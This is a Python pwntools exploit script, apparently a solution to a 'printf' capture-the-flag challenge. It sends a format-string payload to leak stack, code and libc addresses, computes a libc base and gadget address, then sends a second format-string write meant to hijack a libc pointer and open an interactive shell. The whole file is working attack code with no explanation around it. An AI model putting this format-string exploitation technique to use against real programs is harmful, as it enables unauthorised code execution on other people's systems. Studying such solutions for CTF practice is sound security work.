from pwn import *
io=process("./printf-60b0fcfbbb43400426aeae512008bab56879155df25c54037c1304227c43dab4")
#io=remote("printf.chal.ctf.westerns.tokyo",10001)
pay="%llx:"*44+"%llx"
io.sendlineafter("What's your name?",pay)
io.recvuntil("Hi,")
io.recvline()
leak=io.recvline()
leak=leak[-41:]
leak=leak.split(":")
stack=int(leak[3],16)
code=int(leak[0],16)
print "Code : "+hex(code)
print "Stack: "+hex(stack)
base=int(leak[1],16)-0x26b6b
print "Libc : "+hex(base)
#free=base+0x1e4c30+8
free=base+0x1e66c8
io.recvuntil("Do you leave a comment?")
#gdb.attach(io,"b*0x555555555c85")
#gdb.attach(io,"b*0x7ffff7e08398")
syst=base+0xe2383
print hex(free)
gdb.attach(io)
pay="%"+str((stack-0x388)-free)+"x"+"a" * 8 + p64(syst)
io.sendline(pay)
io.interactive()
